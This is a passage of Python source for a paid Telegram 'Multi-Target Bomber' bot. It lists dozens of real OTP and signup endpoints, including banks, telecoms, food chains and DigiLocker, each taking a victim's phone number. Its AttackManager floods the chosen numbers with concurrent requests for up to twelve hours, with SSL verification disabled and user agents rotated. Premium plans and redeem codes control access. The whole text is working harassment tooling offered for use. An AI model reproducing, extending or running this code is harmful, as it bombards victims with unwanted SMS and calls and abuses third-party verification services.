    {"n": "OLA", "u": "https://accounts.olacabs.com/api/login", "m": "POST", "h": {"content-type": "application/json", "x-requested-with": "XMLHttpRequest"}, "d": {"mobileNumber": "{phone}", "dialingCode": "+91", "countryCode": "IN"}},
    {"n": "OLA DRIVE", "u": "https://drive.olacabs.com/oauth/api/v2/web/auth/preauth", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"auth_scheme": "OTP", "provider": "IMSSuvidhaAuth", "credential": {"dialingCode": "+91", "mobileNumber": "{phone}"}}},
    {"n": "EMT", "u": "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/", "m": "POST", "h": {"content-type": "application/json; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}, "d": {"emailph": "{phone}"}},
    {"n": "DOMINOS", "u": "https://api.dominos.co.in/loginhandler/forgotpassword", "m": "POST", "h": {"content-type": "application/json", "api_key": "d2aeb489bb8df385"}, "d": {"lastName": "", "mobile": "{phone}", "firstName": ""}},
    {"n": "PIZZAHUT v2", "u": "https://api.pizzahut.io/v1/otp/generate", "m": "POST", "h": {"content-type": "application/json; charset=utf-8"}, "d": {"phone": "+91{phone}"}},
    {"n": "KFC", "u": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", "m": "POST", "h": {"content-type": "application/json;charset=UTF-8"}, "d": {"phoneNumber": "{phone}", "AuthorizedFor": "3", "Resend": "false"}},
    {"n": "BURGER KING", "u": "https://consumer-apis.burgerking.in/api/v1/user/signUp", "m": "POST", "h": {"content-type": "application/json", "platform": "web", "type": "dinein"}, "d": {"phone_no": "{phone}"}},
    {"n": "DINEOUT", "u": "https://www.dineout.co.in/xhrajaxrequest/user_signup", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}, "d": "name=Tsunami+Bomber&email=tsunami%40gmail.com&phone={phone}"},
    {"n": "PURPLLE", "u": "https://www.purplle.com/api/account/authorization/send_otp?phone={phone}&action=register", "m": "GET", "h": {"device_id": "TEC3cjyVJhEFPGsSHw"}},
    {"n": "ANGEL BROKING", "u": "https://www.angelbroking.com/form-gateways/oda-form.php", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded"}, "d": "name=Tsunami+Bomber&mobile={phone}&city=pune&web_placement_id=21&page_url=%2Fopen-demat-account%2F&post-id=2752"},
    {"n": "ASVM FAIZABAD", "u": "http://asvmfaizabad.org/register.php", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded"}, "d": "name=TsunamiBomber&mobile={phone}&email=hacker%40gmail.com&address=faizabad&pin=224001&submit=Register"},
    {"n": "TIMES PRIME", "u": "https://jsso.indiatimes.com/sso/crossapp/identity/web/registerUser", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"firstName": "Guest", "mobile": "{phone}", "password": "tp@9681095"}},
    {"n": "GAANA SSO", "u": "https://gaanajsso.indiatimes.com/sso/crossapp/identity/web/getLoginOtp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "+91-{phone}"}},
    {"n": "DIGILOCKER", "u": "https://accounts.digitallocker.gov.in/signup/send_otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"aadhaar_mobile": "{phone}"}},
    {"n": "FYND", "u": "https://api.fynd.com/auth/auth/login-or-register/otp?platform=000000000000000000000001", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "countryCode": "91"}},
    {"n": "SKOUT", "u": "https://www.skout.com/api/1/auth/verify-phone", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"application_code": "d46dbe487d5baaa0b176cb55d3bc452c", "phone": "+91{phone}", "countryCode": "IN"}},
    {"n": "YATRA", "u": "https://secure.yatra.com/social/common/yatra/sendMobileOTP", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"isdCode": "91", "mobileNumber": "{phone}"}},
    {"n": "QLEAN", "u": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "91{phone}"}},
    {"n": "MAIL RU", "u": "https://cloud.mail.ru/api/v2/notify/applink", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "+91{phone}", "api": "2", "email": "email", "x-email": "x-email"}},
    {"n": "YOULA", "u": "https://youla.ru/web-api/auth/request_code", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "+91{phone}"}},
    {"n": "IVI RU", "u": "https://api.ivi.ru/mobileapi/user/register/phone/v6", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "91{phone}"}},
    {"n": "ICQ", "u": "https://www.icq.com/smsreg/requestPhoneValidation.php", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded"}, "d": "msisdn=91{phone}"},
    {"n": "MEDPLUS", "u": "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded"}, "d": "recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&mobileNumber={phone}&isCordova=false"},
    {"n": "GETINSTACASH", "u": "https://getinstacash.in/sell/getData.php", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}, "d": "type=sendOTP&mobile={phone}"},
    {"n": "LIMEROAD", "u": "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&doAction=", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded"}, "d": "user_id={phone}"},
    {"n": "CILORY", "u": "https://www.cilory.com/app/w/auth/soft", "m": "POST", "h": {"Content-Type": "application/json;charset=UTF-8"}, "d": {"mobile": "{phone}"}},
    {"n": "NAAPTOL", "u": "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}, "d": {"actionname": "checkMobileUserExistsForTvApp", "mobile": "{phone}"}},
    {"n": "INDIAMART", "u": "https://m.indiamart.com/ajaxrequest/identified/common/login", "m": "POST", "h": {"content-type": "application/json"}, "d": {"ph_code": "91", "use": "{phone}", "pass": ""}},
    {"n": "JIO", "u": "https://www.jio.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "AIRTEL THANKS", "u": "https://www.airtel.in/thanks-app/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "VI", "u": "https://www.myvi.in/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "CAREERS360", "u": "https://www.careers360.com/ajax/no-cache/user/otp-send", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}, "d": "mobile_number={phone}&method=call&uid=12692588"},
    {"n": "ZIVAME", "u": "https://api.zivame.com/v2/customer/login/send-otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone_number": "{phone}", "otp_type": "voice"}},
    {"n": "REALESTATE INDIA CALL", "u": "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php", "m": "POST", "h": {"x-requested-with": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded"}, "d": "action_id=call_to_otp&mob_num={phone}&member_id=1547045"},
    {"n": "UNACADEMY LINK", "u": "https://unacademy.com/api/v1/user/get_app_link/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "NEWTON", "u": "https://my.newtonschool.co/api/v1/user/otp/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "+91{phone}", "registration": True}},
    {"n": "ALLENSOLLY", "u": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobileoremail": "{phone}", "name": "markluther"}},
    {"n": "SBI", "u": "https://www.sbi.co.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "HDFC BANK", "u": "https://www.hdfcbank.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "ICICI BANK", "u": "https://www.icicibank.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "AXIS BANK", "u": "https://www.axisbank.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "KOTAK BANK", "u": "https://www.kotak.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "YES BANK", "u": "https://www.yesbank.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "INDUSIND", "u": "https://www.indusind.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "IDFC", "u": "https://www.idfcfirstbank.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "AU BANK", "u": "https://www.aubank.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "RBL BANK", "u": "https://www.rblbank.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "BANDHAN", "u": "https://www.bandhanbank.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "FEDERAL BANK", "u": "https://www.federalbank.co.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "CANARA", "u": "https://www.canarabank.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "PNB", "u": "https://www.pnbindia.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "BOB", "u": "https://www.bankofbaroda.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "UNION BANK", "u": "https://www.unionbankofindia.co.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "INDIAN BANK", "u": "https://www.indianbank.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "CENTRAL BANK", "u": "https://www.centralbankofindia.co.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "BOI", "u": "https://www.bankofindia.co.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "IDBI", "u": "https://www.idbibank.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "UCO", "u": "https://www.ucobank.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "IOB", "u": "https://www.iob.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "PSB", "u": "https://www.psbindia.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "ACKO", "u": "https://www.acko.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "GODIGIT", "u": "https://www.godigit.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "BAJAJ ALLIANZ", "u": "https://www.bajajallianz.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "STAR HEALTH", "u": "https://www.starhealth.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "MAX BUPA", "u": "https://www.maxbupa.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "KOTAK LIFE", "u": "https://www.kotaklife.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "SBI LIFE", "u": "https://www.sbilife.co.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "LIC", "u": "https://www.licindia.in/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "HDFC LIFE", "u": "https://www.hdfclife.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "TOPPR", "u": "https://www.toppr.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "WHITEHATJR", "u": "https://www.whitehatjr.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "CULT FIT", "u": "https://www.cult.fit/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "HEALTHIFYYME", "u": "https://www.healthifyme.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "PRISTYN", "u": "https://www.pristyncare.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "MFINE", "u": "https://www.mfine.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "DOCSAPP", "u": "https://www.docsapp.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "LYBRATE", "u": "https://www.lybrate.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "PORTEA", "u": "https://www.portea.com/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "HASTAG LOYALTY", "u": "https://dashboardapi.hashtagloyalty.com/v3/sign_up/create_otp?mobile={phone}", "m": "POST", "h": {}},
    {"n": "HALDIRAM", "u": "https://www.haldiram.com/api/v2/otp/send?mobile={phone}", "m": "POST", "h": {}},
    {"n": "KPN WEB WA", "u": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "m": "POST", "h": {"x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "content-type": "application/json"}, "d": {"phone_number": {"number": "{phone}", "country_code": "+91"}, "notification_channel": "WHATSAPP"}},
    {"n": "UDAAN WA2", "u": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded;charset=UTF-8"}, "d": "mobile={phone}"},
]


# ========== BUILD API LIST ==========
def build_api_list():
    skip_placeholders = ["{rand}", "{uuid}", "{captcha}", "{recaptcha}",
                        "{sha_xor_b64}", "{unsigned_auth_token}", "{jwt}",
                        "{csrf}", "{turnstile}", "{apitoken}", "{authtoken}",
                        "{rvt}", "{jiocinema_accesstoken}", "{b64_uuid_timestamp}",
                        "{authkey}", "{basicauth}", "{ip}", "{b64_+91_phone}",
                        "{rand1}", "{rand2}", "{rand3}", "{rand5}", "{rand50}",
                        "{uuid36}"]
    apis = []
    for entry in API_DATA:
        url = entry.get("u", "")
        if not url:
            continue
        has_ph = any(p in url for p in skip_placeholders)
        data_str = str(entry.get("d", ""))
        has_ph_data = any(p in data_str for p in skip_placeholders)
        if has_ph or has_ph_data:
            continue

        api_url = url.replace("{phone}", "{no}")
        data = entry.get("d")
        if isinstance(data, str):
            data = data.replace("{phone}", "{no}")
        elif isinstance(data, dict):
            def rep(d):
                if isinstance(d, dict):
                    return {k: rep(v) for k, v in d.items()}
                elif isinstance(d, list):
                    return [rep(x) for x in d]
                elif isinstance(d, str):
                    return d.replace("{phone}", "{no}")
                return d
            data = rep(data)

        api_obj = {
            "name": entry.get("n", "API"),
            "url": api_url,
            "method": entry.get("m", "POST").upper(),
            "headers": entry.get("h", {}) or {},
            "body": data,
        }
        apis.append(api_obj)

    # Deduplicate
    seen = set()
    unique = []
    for api in apis:
        key = (api["url"], api["method"], str(api.get("body", ""))[:100])
        if key not in seen:
            seen.add(key)
            unique.append(api)
    return unique

APIS = build_api_list()


# ========== DATABASE (MongoDB) ==========
class Database:
    def __init__(self):
        self.temp_attack_data = {}
        try:
            users_col.create_index("user_id", unique=True)
            users_col.create_index("protected_number")
            codes_col.create_index("code", unique=True)
        except Exception as e:
            print(f"⚠️ Index warning: {e}")

    def get_user(self, user_id):
        return users_col.find_one({"user_id": user_id})

    def add_user(self, user_id):
        if not self.get_user(user_id):
            try:
                users_col.insert_one({
                    "user_id": user_id,
                    "premium_expiry": None,
                    "premium_plan": "standard",
                    "protected_number": None
                })
            except Exception:
                pass

    def _parse_expiry(self, user):
        if user and user.get("premium_expiry"):
            try:
                return datetime.strptime(user["premium_expiry"], "%Y-%m-%d %H:%M:%S")
            except:
                return None
        return None

    def _get_active_plan(self, user):
        expiry = self._parse_expiry(user)
        if expiry and datetime.now() < expiry:
            plan = user.get("premium_plan") or "standard"
            return PLANS.get(plan, PLANS["standard"])
        return None

    def get_concurrent_limit(self, user_id):
        if user_id == OWNER_ID:
            return 10
        user = self.get_user(user_id)
        plan = self._get_active_plan(user)
        return plan["concurrent"] if plan else 0

    def get_max_duration(self, user_id):
        if user_id == OWNER_ID:
            return 720
        user = self.get_user(user_id)
        plan = self._get_active_plan(user)
        return plan["max_duration"] if plan else 0

    def get_plan_name(self, user_id):
        if user_id == OWNER_ID:
            return "Ultimate"
        user = self.get_user(user_id)
        plan = self._get_active_plan(user)
        return plan["name"] if plan else "Free"

    def get_expiry(self, user_id):
        user = self.get_user(user_id)
        expiry = self._parse_expiry(user)
        if expiry and datetime.now() < expiry:
            return user["premium_expiry"]
        return "Not Active"

    def is_premium(self, user_id):
        if user_id == OWNER_ID:
            return True
        user = self.get_user(user_id)
        return self._get_active_plan(user) is not None

    def add_premium(self, user_id, days, plan_type="standard"):
        current = datetime.now()
        user = self.get_user(user_id)
        stored = self._parse_expiry(user)
        if stored and stored > current:
            current = stored
        new_exp = current + timedelta(days=days)
        str_exp = new_exp.strftime("%Y-%m-%d %H:%M:%S")
        if not user:
            users_col.insert_one({
                "user_id": user_id,
                "premium_expiry": str_exp,
                "premium_plan": plan_type,
                "protected_number": None
            })
        else:
            users_col.update_one(
                {"user_id": user_id},
                {"$set": {"premium_expiry": str_exp, "premium_plan": plan_type}}
            )
        return str_exp

    def generate_code(self, days, plan_type="standard"):
        for _ in range(10):
            code = "PREMIUM-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            try:
                codes_col.insert_one({"code": code, "days": days, "plan_type": plan_type, "is_used": 0})
                return code
            except Exception:
                continue
        raise Exception("Failed to generate unique code")

    def redeem(self, user_id, code):
        res = codes_col.find_one({"code": code})
        if not res or res.get("is_used") == 1:
            return False, 0, None, None
        days = res["days"]
        plan_type = res["plan_type"]
        try:
            codes_col.update_one({"code": code}, {"$set": {"is_used": 1}})
            exp_date = self.add_premium(user_id, days, plan_type)
            return True, days, plan_type, exp_date
        except Exception:
            return False, 0, None, None

    def protect(self, user_id, number):
        users_col.update_one({"user_id": user_id}, {"$set": {"protected_number": number}})

    def unprotect(self, user_id):
        users_col.update_one({"user_id": user_id}, {"$set": {"protected_number": None}})

    def is_protected(self, number):
        return users_col.find_one({"protected_number": number}) is not None

    def get_all_users(self):
        return [doc["user_id"] for doc in users_col.find({}, {"user_id": 1})]

    def get_stats(self):
        u = users_col.count_documents({})
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        premium = users_col.count_documents({"premium_expiry": {"$gt": now_str}})
        total_codes = codes_col.count_documents({})
        return u, premium, total_codes

    def set_attack_data(self, user_id, targets):
        self.temp_attack_data[user_id] = {'targets': targets, 'timestamp': time.time()}

    def get_attack_data(self, user_id):
        data = self.temp_attack_data.get(user_id)
        if data and time.time() - data['timestamp'] < 300:
            return data['targets']
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]
        return None

    def clear_attack_data(self, user_id):
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]


class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.db = Database()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/145.0.0.0 Safari/537.36",
        ]

    async def _make_request(self, session, api, phone):
        try:
            url = api['url'].replace('{no}', phone)
            headers = dict(api.get('headers', {}))
            headers.setdefault('User-Agent', random.choice(self.user_agents))
            timeout = aiohttp.ClientTimeout(total=8)
            method = api['method'].upper()
            body = api.get('body')
            body_data = None
            if body is not None:
                if isinstance(body, str):
                    body = body.replace('{no}', phone)
                    body_data = body.encode('utf-8')
                elif isinstance(body, dict):
                    body_data = json.dumps(body).replace('{no}', phone).encode('utf-8')
                    headers.setdefault('Content-Type', 'application/json')
            if method == 'GET':
                async with session.get(url, headers=headers, timeout=timeout, ssl=False) as r:
                    await r.read()
                    return True
            elif method == 'PUT':
                async with session.put(url, headers=headers, data=body_data, timeout=timeout, ssl=False) as r:
                    await r.read()
                    return True
            else:
                async with session.post(url, headers=headers, data=body_data, timeout=timeout, ssl=False) as r:
                    await r.read()
                    return True
        except Exception:
            return False

    async def _worker_task(self, user_id, phone, api_list, end_time):
        async with aiohttp.ClientSession() as session:
            while time.time() < end_time:
                if user_id not in self.active_attacks or not self.active_attacks[user_id]["running"]:
                    break
                if phone not in self.active_attacks[user_id]["targets"]:
                    break
                random.shuffle(api_list)
                tasks = [self._make_request(session, api, phone) for api in api_list[:40]]
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(0.3)

    async def start_attack(self, user_id, targets, duration_minutes):
        if user_id in self.active_attacks:
            return False, "Attack already running"
        if not self.db.is_premium(user_id):
            return False, "Premium required"
        max_dur = self.db.get_max_duration(user_id)
        if duration_minutes > max_dur:
            return False, f"Max duration is {max_dur} minutes for your plan"
        concurrency = self.db.get_concurrent_limit(user_id)
        if concurrency == 0:
            return False, "Premium required"
        if len(targets) > concurrency:
            return False, f"Your plan allows max {concurrency} concurrent targets"
        for target in targets:
            if self.db.is_protected(target):
                return False, f"Number {target} is protected!"
        end_time = time.time() + (duration_minutes * 60)
        chunk_size = max(1, len(APIS) // concurrency)
        api_chunks = []
        for i in range(concurrency):
            start_idx = i * chunk_size
            end_idx = start_idx + chunk_size if i < concurrency - 1 else len(APIS)
            api_chunks.append(APIS[start_idx:end_idx])
        self.active_attacks[user_id] = {
            "targets": targets,
            "end_time": end_time,
            "running": True,
            "workers": {}
        }
        for target in targets:
            self.active_attacks[user_id]["workers"][target] = []
            for i in range(concurrency):
                task = asyncio.create_task(self._worker_task(user_id, target, api_chunks[i], end_time))
                self.active_attacks[user_id]["workers"][target].append(task)
        return True, f"Started attack on {len(targets)} target(s) with {concurrency}x workers each"

    async def stop_attack(self, user_id):
        if user_id in self.active_attacks:
            self.active_attacks[user_id]["running"] = False
            for target_workers in self.active_attacks[user_id].get("workers", {}).values():
                for task in target_workers:
                    if not task.done():
                        task.cancel()
            del self.active_attacks[user_id]
            return True
        return False


manager = AttackManager()


async def web_server():
    async def handle(request):
        return web.Response(text=f"Bot Alive! {len(APIS)} APIs loaded.")
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", "8080"))
    for p in [port, 8080, 8081, 8082, 3000, 5000]:
        try:
            site = web.TCPSite(runner, '0.0.0.0', p)
            await site.start()
            print(f"✅ Web server on port {p}")
            return
        except:
            continue


def main_kb(user_id):
    kb = [
        [KeyboardButton("🚀 /mix"), KeyboardButton("📊 /status")],
        [KeyboardButton("👤 /account"), KeyboardButton("💳 /plan")],
        [KeyboardButton("🛡 /protect"), KeyboardButton("🔓 /unprotect")],
        [KeyboardButton("🔑 /redeem"), KeyboardButton("❓ /help")]
    ]
    if user_id == OWNER_ID:
        kb.append([KeyboardButton("👑 Admin")])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)


def multi_target_kb(user_id):
    max_targets = manager.db.get_concurrent_limit(user_id)
    buttons = []
    for i in range(1, min(max_targets, 10) + 1):
        buttons.append([InlineKeyboardButton(f"🎯 {i} Target(s)", callback_data=f"targets_{i}")])
    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(buttons)


def duration_kb(user_id):
    max_dur = manager.db.get_max_duration(user_id)
    buttons = []
    row = []
    for minutes in [1, 5, 15, 30, 60, 120, 180, 240, 300, 360, 480, 600, 720]:
        if minutes <= max_dur:
            label = f"{minutes}min" if minutes < 60 else ("1h" if minutes == 60 else f"{minutes//60}h")
            row.append(InlineKeyboardButton(label, callback_data=f"dur_{minutes}"))
            if len(row) == 3:
                buttons.append(row); row = []
    if row: buttons.append(row)
    buttons.append([InlineKeyboardButton(f"⚡ {manager.db.get_concurrent_limit(user_id)}x Concurrent", callback_data="info")])
    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(buttons)


# ========== HANDLERS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    manager.db.add_user(uid)
    is_prem = manager.db.is_premium(uid)
    badge = f"{E_CROWN} PREMIUM" if is_prem else f"{E_STAR} FREE"
    cap = (f'{E_FIRE} <b>Welcome to Premium Multi-Target Bomber!</b> {E_FIRE}\n\n'
           f'{E_USER} Status: {badge}\n'
           f'{E_CHART} APIs Loaded: <b>{len(APIS)}</b>\n\n'
           f'{E_ROCKET} Use /help for commands')
    try:
        await update.message.reply_photo(WELCOME_IMAGE, caption=cap, reply_markup=main_kb(uid), parse_mode=ParseMode.HTML)
    except Exception:
        await update.message.reply_text(cap, reply_markup=main_kb(uid), parse_mode=ParseMode.HTML)


async def mix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not manager.db.is_premium(uid):
        await update.message.reply_text(f'{E_CROSS} <b>Premium Required!</b>\n\nUse /plan to buy or /redeem to activate.', parse_mode=ParseMode.HTML)
        return
    if uid in manager.active_attacks:
        await update.message.reply_text(f'{E_BOLT} <b>Attack already running!</b>', parse_mode=ParseMode.HTML)
        return
    max_targets = manager.db.get_concurrent_limit(uid)
    await update.message.reply_text(
        f'{E_TARGET} <b>Select number of targets</b> (Max: {max_targets}):',
        reply_markup=multi_target_kb(uid), parse_mode=ParseMode.HTML)


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in manager.active_attacks:
        info = manager.active_attacks[uid]
        left = int((info['end_time'] - time.time()) / 60)
        targets = ", ".join(info['targets'])
        txt = (f'{E_FIRE} <b>ATTACK RUNNING</b> {E_FIRE}\n\n'
               f'{E_TARGET} Targets: <code>{targets}</code>\n'
               f'{E_CHART} Count: <b>{len(info["targets"])}</b>\n'
               f'{E_TIME} Left: <b>{left} min</b>')
        await update.message.reply_text(txt,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP ALL", callback_data="stop")]]),
            parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(f'{E_STAR} <b>No active attacks.</b>', parse_mode=ParseMode.HTML)


async def account_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    is_prem = manager.db.is_premium(uid)
    badge = f'{E_CROWN} PREMIUM' if is_prem else f'{E_STAR} FREE'
    txt = (f'{E_USER} <b>ACCOUNT</b>\n\n'
           f'🆔 ID: <code>{uid}</code>\n'
           f'{E_DIAMOND} Badge: {badge}\n'
           f'📋 Plan: <b>{manager.db.get_plan_name(uid)}</b>\n'
           f'📅 Expiry: <b>{manager.db.get_expiry(uid)}</b>\n'
           f'{E_BOLT} Concurrent: <b>{manager.db.get_concurrent_limit(uid)}</b>\n'
           f'{E_TIME} Max Duration: <b>{manager.db.get_max_duration(uid)} min</b>')
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML)


async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = f'{E_CARD} <b>AVAILABLE SUBSCRIPTION PLANS</b>\n\n'
    for key, p in PLANS.items():
        msg += (f'{E_DIAMOND} <b>{p["name"]} Plan</b> (₹{p["price"]})\n'
                f'   ├ Duration: {p["days"]} Days\n'
                f'   ├ Concurrent: {p["concurrent"]} targets\n'
                f'   └ Max Duration: {p["max_duration"]} min\n\n')
    msg += f'{E_KEY} Use /redeem if you have a code.\n💬 Contact @METOCXIC'
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("👤 Contact Admin", url=f"tg://user?id={OWNER_ID}")]])
    await update.message.reply_text(msg, reply_markup=kb, parse_mode=ParseMode.HTML)


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f'{E_KEY} <b>Send your premium code:</b>\n\nFormat: <code>PREMIUM-XXXXXXXX</code>', parse_mode=ParseMode.HTML)
    context.user_data['waiting_for_redeem'] = True


async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not manager.db.is_premium(uid):
        await update.message.reply_text(f'{E_CROSS} Premium required!', parse_mode=ParseMode.HTML)
        return
